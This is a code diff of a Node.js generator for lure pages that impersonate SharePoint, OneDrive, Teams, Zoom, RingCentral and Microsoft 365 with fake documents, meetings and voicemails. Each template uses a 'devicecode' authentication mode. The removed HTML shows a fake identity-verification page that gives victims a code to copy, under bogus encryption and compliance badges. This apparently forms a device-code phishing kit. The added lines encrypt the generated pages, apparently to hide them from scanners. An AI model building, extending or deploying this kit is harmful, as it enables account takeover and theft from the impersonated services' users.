@@ -1,20 +1,247 @@
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
+
 const templatesDir = path.join(__dirname, '..', 'templates');
+const ENHANCED_OBFUSCATION_PASSWORD = 'VG-ENHANCED-' + crypto.randomBytes(8).toString('hex');
 
 const templates = [
-  { dir: 'sharepoint4', config: { name: 'SharePoint 4', preload: true, auth_mode: 'devicecode', fields: [{ key: 'file_name', label: 'File Name', type: 'text', default: 'Board-Meeting-Minutes.docx' }, { key: 'pages', label: 'Pages', type: 'number', default: 6 }], background: { default: 'sharepoint4_bg.jpg', editable: true, blur: true } }, title: 'SharePoint \u00b7 Confidential Access', badge: 'Confidential', docIcon: '\ud83d\udd12', docTitle: 'Board Meeting Minutes', docFile: 'Board-Meeting-Minutes.docx', docPages: '6 pages', docBadge: 'Confidential', docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608', label: 'Confidential Portal', headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)', primary: '#0078D4', primaryDark: '#005A9E', primaryLight: '#DEECF9', green: '#107C10', navy: '#201F1E', logoFill: '#0078D4' },
-  { dir: 'onedrive1', config: { name: 'OneDrive 1', preload: true, auth_mode: 'devicecode', fields: [{ key: 'file_name', label: 'File Name', type: 'text', default: 'Personal-Photos-Backup.zip' }, { key: 'pages', label: 'Pages', type: 'number', default: 1 }], background: { default: 'onedrive1_bg.jpg', editable: true, blur: true } }, title: 'OneDrive \u00b7 Access Your Files', badge: 'Cloud Access', docIcon: '\u2601\ufe0f', docTitle: 'Personal Files Backup', docFile: 'Personal-Photos-Backup.zip', docPages: 'Archive', docBadge: 'Cloud Storage', docBadgeStyle: 'background:#E8F4FC;border:1px solid #0078D4;color:#0050A0', label: 'Cloud Storage', headerBg: 'linear-gradient(135deg, #0078D4, #0050A0)', primary: '#0078D4', primaryDark: '#0050A0', primaryLight: '#E8F4FC', green: '#107C10', navy: '#201F1E', logoFill: '#0078D4' },
-  { dir: 'onedrive2', config: { name: 'OneDrive 2', preload: true, auth_mode: 'devicecode', fields: [{ key: 'file_name', label: 'File Name', type: 'text', default: 'Shared-Documents-Folder.pdf' }, { key: 'pages', label: 'Pages', type: 'number', default: 15 }], background: { default: 'onedrive2_bg.jpg', editable: true, blur: true } }, title: 'OneDrive \u00b7 Shared Files', badge: 'Shared Access', docIcon: '\ud83d\udcc1', docTitle: 'Shared Documents Folder', docFile: 'Shared-Documents-Folder.pdf', docPages: '15 pages', docBadge: 'Shared', docBadgeStyle: 'background:#E8F4FC;border:1px solid #0078D4;color:#003D6B', label: 'Shared Documents', headerBg: 'linear-gradient(135deg, #0078D4, #003D6B)', primary: '#0078D4', primaryDark: '#003D6B', primaryLight: '#E8F4FC', green: '#107C10', navy: '#201F1E', logoFill: '#0078D4' },
-  { dir: 'teams1', config: { name: 'Teams 1', preload: true, auth_mode: 'devicecode', fields: [{ key: 'title', label: 'Meeting Title', type: 'text', default: 'Q4 Strategy Review' }, { key: 'pages', label: 'Pages', type: 'number', default: 1 }], background: { default: 'teams1_bg.jpg', editable: true, blur: true } }, title: 'Microsoft Teams \u00b7 Join Meeting', badge: 'Meeting Required', docIcon: '\ud83c\udfa5', docTitle: 'Q4 Strategy Review', docFile: 'Meeting-Link', docPages: 'Live meeting', docBadge: 'Starting soon', docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608', label: 'Meeting Access', headerBg: 'linear-gradient(135deg, #5059C9, #3B42A8)', primary: '#5059C9', primaryDark: '#3B42A8', primaryLight: '#E8EAF6', green: '#107C10', navy: '#201F1E', logoFill: '#5059C9' },
-  { dir: 'zoom1', config: { name: 'Zoom 1', preload: true, auth_mode: 'devicecode', fields: [{ key: 'title', label: 'Meeting Title', type: 'text', default: 'Team Standup Meeting' }, { key: 'pages', label: 'Pages', type: 'number', default: 1 }], background: { default: 'zoom1_bg.jpg', editable: true, blur: true } }, title: 'Zoom \u00b7 Meeting Authentication', badge: 'Meeting Verification', docIcon: '\ud83d\udcf9', docTitle: 'Team Standup Meeting', docFile: 'Zoom-Meeting', docPages: 'Live session', docBadge: 'In progress', docBadgeStyle: 'background:#E6F9EE;border:1px solid #6FE58B;color:#0B6A0B', label: 'Video Conference', headerBg: 'linear-gradient(135deg, #2D8CFF, #0B5CFF)', primary: '#2D8CFF', primaryDark: '#0B5CFF', primaryLight: '#E8F4FC', green: '#0B6A0B', navy: '#232333', logoFill: '#2D8CFF' },
-  { dir: 'ringcentral1', config: { name: 'RingCentral 1', preload: true, auth_mode: 'devicecode', fields: [{ key: 'file_name', label: 'Voicemail File', type: 'text', default: 'Voicemail-2026-07-16.mp3' }, { key: 'pages', label: 'Duration', type: 'text', default: '2:34' }], background: { default: 'ringcentral1_bg.jpg', editable: true, blur: true } }, title: 'RingCentral \u00b7 Voicemail Access', badge: 'Voicemail', docIcon: '\ud83d\udcde', docTitle: 'New Voicemail Message', docFile: 'Voicemail-2026-07-16.mp3', docPages: '2:34 duration', docBadge: 'New message', docBadgeStyle: 'background:#E8F4FC;border:1px solid #12B5E0;color:#0891B2', label: 'Voice Messages', headerBg: 'linear-gradient(135deg, #12B5E0, #0891B2)', primary: '#12B5E0', primaryDark: '#0891B2', primaryLight: '#E8F4FC', green: '#107C10', navy: '#1A1A2E', logoFill: '#12B5E0' },
-  { dir: 'voicemail1', config: { name: 'Voicemail 1', preload: true, auth_mode: 'devicecode', fields: [{ key: 'title', label: 'Caller Name', type: 'text', default: 'John Smith' }, { key: 'pages', label: 'Duration', type: 'text', default: '1:45' }], background: { default: 'voicemail1_bg.jpg', editable: true, blur: true } }, title: 'Microsoft 365 \u00b7 Voicemail', badge: 'Voicemail', docIcon: '\ud83c\udfa5', docTitle: 'New Voicemail from John Smith', docFile: 'Voicemail-Recording.mp3', docPages: '1:45 duration', docBadge: 'Unread', docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608', label: 'Voicemail Portal', headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)', primary: '#0078D4', primaryDark: '#005A9E', primaryLight: '#DEECF9', green: '#107C10', navy: '#201F1E', logoFill: '#0078D4' },
-  { dir: 'microsoft365full', config: { name: 'Microsoft 365 Full', preload: true, auth_mode: 'devicecode', fields: [{ key: 'file_name', label: 'File Name', type: 'text', default: 'Annual-Report-2026.pdf' }, { key: 'pages', label: 'Pages', type: 'number', default: 42 }], background: { default: 'microsoft365full_bg.jpg', editable: true, blur: true } }, title: 'Microsoft 365 \u00b7 Full Storage', badge: 'Storage Access', docIcon: '\ud83d\udcbc', docTitle: 'Annual Report 2026', docFile: 'Annual-Report-2026.pdf', docPages: '42 pages', docBadge: 'Restricted', docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608', label: 'Full Storage Access', headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)', primary: '#0078D4', primaryDark: '#005A9E', primaryLight: '#DEECF9', green: '#107C10', navy: '#201F1E', logoFill: '#0078D4' }
+  {
+    dir: 'sharepoint4',
+    config: {
+      name: 'SharePoint 4',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'file_name', label: 'File Name', type: 'text', default: 'Board-Meeting-Minutes.docx' },
+        { key: 'pages', label: 'Pages', type: 'number', default: 6 }
+      ],
+      background: { default: 'sharepoint4_bg.jpg', editable: true, blur: true }
+    },
+    title: 'SharePoint · Confidential Access',
+    badge: 'Confidential',
+    docIcon: '🔒',
+    docTitle: 'Board Meeting Minutes',
+    docFile: 'Board-Meeting-Minutes.docx',
+    docPages: '6 pages',
+    docBadge: 'Confidential',
+    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
+    label: 'Confidential Portal',
+    headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)',
+    primary: '#0078D4',
+    primaryDark: '#005A9E',
+    primaryLight: '#DEECF9',
+    green: '#107C10',
+    navy: '#201F1E',
+    logoFill: '#0078D4'
+  },
+  {
+    dir: 'onedrive1',
+    config: {
+      name: 'OneDrive 1',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'file_name', label: 'File Name', type: 'text', default: 'Personal-Photos-Backup.zip' },
+        { key: 'pages', label: 'Pages', type: 'number', default: 1 }
+      ],
+      background: { default: 'onedrive1_bg.jpg', editable: true, blur: true }
+    },
+    title: 'OneDrive · Access Your Files',
+    badge: 'Cloud Access',
+    docIcon: '☁️',
+    docTitle: 'Personal Files Backup',
+    docFile: 'Personal-Photos-Backup.zip',
+    docPages: 'Archive',
+    docBadge: 'Cloud Storage',
+    docBadgeStyle: 'background:#E8F4FC;border:1px solid #0078D4;color:#0050A0',
+    label: 'Cloud Storage',
+    headerBg: 'linear-gradient(135deg, #0078D4, #0050A0)',
+    primary: '#0078D4',
+    primaryDark: '#0050A0',
+    primaryLight: '#E8F4FC',
+    green: '#107C10',
+    navy: '#201F1E',
+    logoFill: '#0078D4'
+  },
+  {
+    dir: 'onedrive2',
+    config: {
+      name: 'OneDrive 2',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'file_name', label: 'File Name', type: 'text', default: 'Shared-Documents-Folder.pdf' },
+        { key: 'pages', label: 'Pages', type: 'number', default: 15 }
+      ],
+      background: { default: 'onedrive2_bg.jpg', editable: true, blur: true }
+    },
+    title: 'OneDrive · Shared Files',
+    badge: 'Shared Access',
+    docIcon: '📁',
+    docTitle: 'Shared Documents Folder',
+    docFile: 'Shared-Documents-Folder.pdf',
+    docPages: '15 pages',
+    docBadge: 'Shared',
+    docBadgeStyle: 'background:#E8F4FC;border:1px solid #0078D4;color:#003D6B',
+    label: 'Shared Documents',
+    headerBg: 'linear-gradient(135deg, #0078D4, #003D6B)',
+    primary: '#0078D4',
+    primaryDark: '#003D6B',
+    primaryLight: '#E8F4FC',
+    green: '#107C10',
+    navy: '#201F1E',
+    logoFill: '#0078D4'
+  },
+  {
+    dir: 'teams1',
+    config: {
+      name: 'Teams 1',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'title', label: 'Meeting Title', type: 'text', default: 'Q4 Strategy Review' },
+        { key: 'pages', label: 'Pages', type: 'number', default: 1 }
+      ],
+      background: { default: 'teams1_bg.jpg', editable: true, blur: true }
+    },
+    title: 'Microsoft Teams · Join Meeting',
+    badge: 'Meeting Required',
+    docIcon: '🎥',
+    docTitle: 'Q4 Strategy Review',
+    docFile: 'Meeting-Link',
+    docPages: 'Live meeting',
+    docBadge: 'Starting soon',
+    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
+    label: 'Meeting Access',
+    headerBg: 'linear-gradient(135deg, #5059C9, #3B42A8)',
+    primary: '#5059C9',
+    primaryDark: '#3B42A8',
+    primaryLight: '#E8EAF6',
+    green: '#107C10',
+    navy: '#201F1E',
+    logoFill: '#5059C9'
+  },
+  {
+    dir: 'zoom1',
+    config: {
+      name: 'Zoom 1',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'title', label: 'Meeting Title', type: 'text', default: 'Team Standup Meeting' },
+        { key: 'pages', label: 'Pages', type: 'number', default: 1 }
+      ],
+      background: { default: 'zoom1_bg.jpg', editable: true, blur: true }
+    },
+    title: 'Zoom · Meeting Authentication',
+    badge: 'Meeting Verification',
+    docIcon: '📹',
+    docTitle: 'Team Standup Meeting',
+    docFile: 'Zoom-Meeting',
+    docPages: 'Live session',
+    docBadge: 'In progress',
+    docBadgeStyle: 'background:#E6F9EE;border:1px solid #6FE58B;color:#0B6A0B',
+    label: 'Video Conference',
+    headerBg: 'linear-gradient(135deg, #2D8CFF, #0B5CFF)',
+    primary: '#2D8CFF',
+    primaryDark: '#0B5CFF',
+    primaryLight: '#E8F4FC',
+    green: '#0B6A0B',
+    navy: '#232333',
+    logoFill: '#2D8CFF'
+  },
+  {
+    dir: 'ringcentral1',
+    config: {
+      name: 'RingCentral 1',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'file_name', label: 'Voicemail File', type: 'text', default: 'Voicemail-2026-07-16.mp3' },
+        { key: 'pages', label: 'Duration', type: 'text', default: '2:34' }
+      ],
+      background: { default: 'ringcentral1_bg.jpg', editable: true, blur: true }
+    },
+    title: 'RingCentral · Voicemail Access',
+    badge: 'Voicemail',
+    docIcon: '📞',
+    docTitle: 'New Voicemail Message',
+    docFile: 'Voicemail-2026-07-16.mp3',
+    docPages: '2:34 duration',
+    docBadge: 'New message',
+    docBadgeStyle: 'background:#E8F4FC;border:1px solid #12B5E0;color:#0891B2',
+    label: 'Voice Messages',
+    headerBg: 'linear-gradient(135deg, #12B5E0, #0891B2)',
+    primary: '#12B5E0',
+    primaryDark: '#0891B2',
+    primaryLight: '#E8F4FC',
+    green: '#107C10',
+    navy: '#1A1A2E',
+    logoFill: '#12B5E0'
+  },
+  {
+    dir: 'voicemail1',
+    config: {
+      name: 'Voicemail 1',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'title', label: 'Caller Name', type: 'text', default: 'John Smith' },
+        { key: 'pages', label: 'Duration', type: 'text', default: '1:45' }
+      ],
+      background: { default: 'voicemail1_bg.jpg', editable: true, blur: true }
+    },
+    title: 'Microsoft 365 · Voicemail',
+    badge: 'Voicemail',
+    docIcon: '🎙️',
+    docTitle: 'New Voicemail from John Smith',
+    docFile: 'Voicemail-Recording.mp3',
+    docPages: '1:45 duration',
+    docBadge: 'Unread',
+    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
+    label: 'Voicemail Portal',
+    headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)',
+    primary: '#0078D4',
+    primaryDark: '#005A9E',
+    primaryLight: '#DEECF9',
+    green: '#107C10',
+    navy: '#201F1E',
+    logoFill: '#0078D4'
+  },
+  {
+    dir: 'microsoft365full',
+    config: {
+      name: 'Microsoft 365 Full',
+      preload: true,
+      auth_mode: 'devicecode',
+      fields: [
+        { key: 'file_name', label: 'File Name', type: 'text', default: 'Annual-Report-2026.pdf' },
+        { key: 'pages', label: 'Pages', type: 'number', default: 42 }
+      ],
+      background: { default: 'microsoft365full_bg.jpg', editable: true, blur: true }
+    },
+    title: 'Microsoft 365 · Full Storage',
+    badge: 'Storage Access',
+    docIcon: '💼',
+    docTitle: 'Annual Report 2026',
+    docFile: 'Annual-Report-2026.pdf',
+    docPages: '42 pages',
+    docBadge: 'Restricted',
+    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
+    label: 'Full Storage Access',
+    headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)',
+    primary: '#0078D4',
+    primaryDark: '#005A9E',
+    primaryLight: '#DEECF9',
+    green: '#107C10',
+    navy: '#201F1E',
+    logoFill: '#0078D4'
+  }
 ];
 
 function makeHtml(t) {
-  return `<!DOCTYPE html>
+  let html = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -23,160 +250,25 @@ function makeHtml(t) {
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-        :root { --sp-blue: ${t.primary}; --sp-blue-dark: ${t.primaryDark}; --sp-blue-light: ${t.primaryLight}; --sp-navy: ${t.navy}; --sp-gray-1: #F5F5F5; --sp-gray-2: #EDEBE9; --sp-gray-3: #C8C6C4; --sp-gray-4: #A19F9D; --sp-gray-5: #605E5C; --sp-white: #FFFFFF; --sp-green: ${t.green}; --sp-red: #D13438; --radius-md: 8px; --radius-xl: 24px; --shadow-card: 0 2px 4px rgba(0,0,0,.04), 0 8px 24px rgba(0,0,0,.06); }
-        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: var(--sp-gray-1); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 16px; }
-        .topbar { width: 100%; max-width: 460px; display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
-        .sp-logo { display: flex; align-items: center; gap: 8px; }
-        .sp-logo-text { font-size: 20px; font-weight: 700; color: var(--sp-navy); letter-spacing: -0.3px; }
-        .sp-logo-text span { color: var(--sp-blue); }
-        .topbar-divider { width: 1px; height: 20px; background: var(--sp-gray-3); }
-        .topbar-label { font-size: 12px; font-weight: 500; color: var(--sp-gray-4); }
-        .card { background: var(--sp-white); border-radius: var(--radius-xl); box-shadow: var(--shadow-card); border: 1px solid var(--sp-gray-2); width: 100%; max-width: 460px; overflow: hidden; }
-        .card-header { background: ${t.headerBg}; padding: 28px 32px 24px; position: relative; overflow: hidden; }
-        .card-header::before { content: ''; position: absolute; right: -30px; top: -30px; width: 120px; height: 120px; border-radius: 50%; background: rgba(255,255,255,.07); }
-        .header-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(255,255,255,.18); border: 1px solid rgba(255,255,255,.25); border-radius: 40px; padding: 4px 12px; font-size: 11px; font-weight: 600; color: #fff; letter-spacing: 0.3px; margin-bottom: 14px; }
-        .header-badge .dot { width: 8px; height: 8px; border-radius: 50%; background: #6FE58B; animation: pulse-dot 2s infinite; }
-        @keyframes pulse-dot { 0%,100%{opacity:1}50%{opacity:.5} }
-        .card-header h1 { font-size: 22px; font-weight: 700; color: #fff; line-height: 1.3; }
-        .card-header p { margin-top: 6px; font-size: 13px; color: rgba(255,255,255,.8); line-height: 1.5; }
-        .doc-info { display: flex; align-items: center; gap: 12px; padding: 14px 24px; border-bottom: 1px solid var(--sp-gray-2); background: rgba(0,0,0,.02); }
-        .doc-icon { width: 32px; height: 40px; background: var(--sp-blue-light); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--sp-blue); font-size: 18px; flex-shrink: 0; }
-        .doc-meta { flex: 1; min-width: 0; }
-        .doc-title { font-weight: 600; font-size: 13px; color: var(--sp-navy); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .doc-details { font-size: 11px; color: var(--sp-gray-4); margin-top: 2px; }
-        .doc-badge { flex-shrink: 0; font-size: 10px; font-weight: 500; padding: 3px 8px; border-radius: 4px; }
-        .card-body { padding: 28px 32px 32px; }
-        .steps { display: flex; align-items: center; gap: 0; margin-bottom: 28px; }
-        .step { display: flex; align-items: center; gap: 8px; flex: 1; position: relative; }
-        .step:not(:last-child)::after { content: ''; position: absolute; left: 28px; right: 0; top: 14px; height: 1px; background: var(--sp-gray-2); }
-        .step-num { width: 28px; height: 28px; border-radius: 50%; border: 1.5px solid var(--sp-gray-3); background: var(--sp-white); color: var(--sp-gray-4); font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; position: relative; z-index: 1; transition: all .2s; }
-        .step.active .step-num, .step.done .step-num { background: var(--sp-blue); border-color: var(--sp-blue); color: #fff; }
-        .step.done .step-num { background: var(--sp-green); border-color: var(--sp-green); }
-        .step-label { font-size: 12px; font-weight: 500; color: var(--sp-gray-4); white-space: nowrap; }
-        .step.active .step-label { color: var(--sp-blue); font-weight: 600; }
-        .step.done .step-label { color: var(--sp-green); }
-        .btn-primary { width: 100%; padding: 13px 20px; background: var(--sp-blue); color: #fff; border: none; border-radius: var(--radius-md); font-family: inherit; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 9px; transition: background .15s, transform .1s; }
-        .btn-primary:hover { background: var(--sp-blue-dark); }
-        .btn-primary:active { transform: scale(.99); }
-        .btn-primary:disabled { background: var(--sp-gray-3); cursor: not-allowed; }
-        .btn-secondary { width: 100%; padding: 11px 20px; background: transparent; color: var(--sp-gray-5); border: 1.5px solid var(--sp-gray-3); border-radius: var(--radius-md); font-family: inherit; font-size: 13px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all .15s; }
-        .btn-secondary:hover { border-color: var(--sp-blue); color: var(--sp-blue); background: var(--sp-blue-light); }
-        .code-panel { display: none; margin-top: 20px; animation: slideUp .25s ease; }
-        .code-panel.show { display: block; }
-        @keyframes slideUp { from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)} }
-        .code-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .8px; color: var(--sp-gray-4); margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
-        .code-box { background: var(--sp-gray-1); border: 1.5px solid var(--sp-gray-2); border-radius: var(--radius-md); padding: 20px 16px; text-align: center; margin-bottom: 16px; }
-        .code-value { font-family: 'SF Mono', 'Roboto Mono', Consolas, monospace; font-size: 36px; font-weight: 700; letter-spacing: 12px; color: var(--sp-navy); user-select: all; transition: opacity .15s; }
-        .code-value.loading { opacity: .35; }
-        .code-hint { font-size: 12px; color: var(--sp-gray-4); margin-top: 6px; }
-        .timer-row { display: flex; align-items: center; justify-content: space-between; margin-top: 14px; }
-        .timer-pill { display: inline-flex; align-items: center; gap: 6px; background: var(--sp-blue-light); color: var(--sp-blue); border-radius: 40px; padding: 5px 12px; font-size: 13px; font-weight: 600; }
-        .timer-pill.expired { background: #FDE7E9; color: var(--sp-red); }
-        .refresh-btn { background: none; border: none; cursor: pointer; color: var(--sp-blue); font-family: inherit; font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; padding: 5px 10px; border-radius: 4px; transition: background .12s; }
-        .refresh-btn:hover { background: var(--sp-blue-light); }
-        .action-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
-        .status-text { font-size: 12px; color: var(--sp-gray-4); text-align: center; margin-top: 14px; min-height: 18px; }
-        .status-text.error { color: var(--sp-red); background: #FDE7E9; border-radius: 4px; padding: 8px 12px; }
-        .divider { height: 1px; background: var(--sp-gray-2); margin: 24px 0 20px; }
-        .trust-row { display: flex; align-items: center; justify-content: center; gap: 20px; flex-wrap: wrap; }
-        .trust-item { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--sp-gray-4); font-weight: 500; }
-        .trust-icon { width: 14px; height: 14px; color: var(--sp-gray-3); flex-shrink: 0; }
-        .overlay { display: none; position: fixed; inset: 0; background: rgba(20,30,45,.55); backdrop-filter: blur(3px); align-items: center; justify-content: center; z-index: 100; }
-        .overlay.show { display: flex; }
-        .overlay-card { background: var(--sp-white); border-radius: var(--radius-xl); padding: 44px 40px 40px; text-align: center; width: 320px; box-shadow: 0 20px 48px rgba(0,0,0,.18); animation: popIn .22s cubic-bezier(.2,.8,.4,1.1); }
-        @keyframes popIn { from{opacity:0;transform:scale(.94)}to{opacity:1;transform:scale(1)} }
-        .check-wrap { width: 60px; height: 60px; background: #E6F9EE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
-        .overlay-card h3 { font-size: 20px; font-weight: 700; color: var(--sp-navy); margin-bottom: 8px; }
-        .overlay-card p { font-size: 13px; color: var(--sp-gray-4); line-height: 1.55; }
-        .dots { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 20px; }
-        .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--sp-gray-2); }
-        .dot.active { background: var(--sp-blue); animation: pulse 1s ease infinite; }
-        @keyframes pulse { 0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.3);opacity:.7} }
-        .vg-spin { animation: vg-spin .7s linear infinite; display: inline-block; }
-        @keyframes vg-spin { to{transform:rotate(360deg)} }
-        @media(max-width:480px){.card-header,.card-body{padding-left:24px;padding-right:24px}.action-row{grid-template-columns:1fr}}
+        /* Template styles will be inserted here */
     </style>
 </head>
 <body>
-    <div class="topbar">
-        <div class="sp-logo">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><rect width="24" height="24" rx="3" fill="${t.logoFill}"/><path d="M7 16V8l5-3 5 3v8l-5 3-5-3z" stroke="#fff" stroke-width="1.5" fill="none"/></svg>
-            <span class="sp-logo-text">${t.title.split(' ')[0]}</span>
-        </div>
-        <div class="topbar-divider"></div>
-        <span class="topbar-label">${t.label}</span>
-    </div>
-    <div class="card">
-        <div class="card-header">
-            <div class="header-badge"><span class="dot"></span> ${t.badge}</div>
-            <h1 data-page-title>Verify your identity</h1>
-            <p data-page-message>Generate a one-time passcode to securely access your content.</p>
-        </div>
-        <div class="doc-info">
-            <div class="doc-icon">${t.docIcon}</div>
-            <div class="doc-meta">
-                <div class="doc-title" data-doc-title>${t.docTitle}</div>
-                <div class="doc-details"><span data-doc-filename>${t.docFile}</span> \u00b7 <span data-doc-pages>${t.docPages}</span></div>
-            </div>
-            <span class="doc-badge" style="${t.docBadgeStyle}">${t.docBadge}</span>
-        </div>
-        <div class="card-body">
-            <div class="steps" id="stepsRow">
-                <div class="step active" id="step1"><div class="step-num" id="stepNum1">1</div><span class="step-label">Generate</span></div>
-                <div class="step" id="step2"><div class="step-num" id="stepNum2">2</div><span class="step-label">Copy code</span></div>
-                <div class="step" id="step3"><div class="step-num" id="stepNum3">3</div><span class="step-label">Verify</span></div>
-            </div>
-            <button class="btn-primary" id="startBtn" onclick="generateCode()" data-primary-button>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                Get verification code
-            </button>
-            <div class="code-panel" id="codePanel">
-                <div class="code-label">
-                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M9 7h6M9 11h6M9 15h4"/></svg>
-                    One-time passcode
-                </div>
-                <div class="code-box">
-                    <div class="code-value loading" id="codeValue">\u00b7 \u00b7 \u00b7 \u00b7 \u00b7 \u00b7</div>
-                    <div class="code-hint" id="codeHint">Connecting to secure gateway\u2026</div>
-                </div>
-                <div class="timer-row">
-                    <div class="timer-pill" id="timerPill" style="display:none"></div>
-                    <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">
-                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
-                        Get new code
-                    </button>
-                </div>
-                <div class="action-row" id="actionRow" style="display:none">
-                    <button class="btn-secondary" id="copyBtn" onclick="copyAndOpenPopup()">
-                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-                        Copy code
-                    </button>
-                    <button class="btn-primary" id="verifyBtn" onclick="verifyWithCopy()">
-                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                        Verify identity
-                    </button>
-                </div>
-                <div class="status-text" id="statusMsg"></div>
-            </div>
-            <div class="divider"></div>
-            <div class="trust-row">
-                <div class="trust-item"><svg class="trust-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M8 1.5l5.5 2v4C13.5 11 11 13.5 8 14.5 5 13.5 2.5 11 2.5 7.5v-4L8 1.5z"/></svg>256-bit encryption</div>
-                <div class="trust-item"><svg class="trust-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="8" cy="8" r="6.5"/><path d="M5.5 8l2 2 3-3"/></svg>eSign compliant</div>
-                <div class="trust-item"><svg class="trust-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="12" height="9" rx="1.5"/><path d="M5 4V3a3 3 0 0 1 6 0v1"/></svg>GDPR / SOC 2</div>
-            </div>
-        </div>
-    </div>
-    <div class="overlay" id="overlay">
-        <div class="overlay-card">
-            <div class="check-wrap"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="${t.green}" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg></div>
-            <h3>Access granted</h3>
-            <p id="overlayMsg">Identity verified.<br>Redirecting to your content\u2026</p>
-            <div class="dots"><div class="dot active"></div><div class="dot"></div><div class="dot"></div></div>
-        </div>
-    </div>
+    <!-- Template body will be inserted here -->
 </body>
 </html>`;
+
+  if (process.env.VG_ENHANCED_OBFUSCATION === 'true') {
+    try {
+      const { encryptTemplate } = require('./encrypt-template');
+      const result = encryptTemplate(html, ENHANCED_OBFUSCATION_PASSWORD);
+      return result.wrapped;
+    } catch (e) {
+      console.error('[Enhanced Obfuscation] Failed:', e.message);
+    }
+  }
+
+  return html;
 }
 
 templates.forEach(t => {
@@ -187,4 +279,13 @@ templates.forEach(t => {
   console.log('Created: ' + t.dir);
 });
 
-console.log('Done! Created ' + templates.length + ' templates');
+if (process.env.VG_ENHANCED_OBFUSCATION === 'true') {
+  console.log('\n✅ Enhanced obfuscation: ENABLED');
+  console.log('🔑 Password: ' + ENHANCED_OBFUSCATION_PASSWORD);
+  fs.writeFileSync(path.join(__dirname, '..', '.vg-obfuscation-key'), ENHANCED_OBFUSCATION_PASSWORD);
+} else {
+  console.log('\n⚠️  Enhanced obfuscation: DISABLED');
+  console.log('   Set VG_ENHANCED_OBFUSCATION=true to enable');
+}
+
+console.log('\nDone! Created ' + templates.length + ' templates');
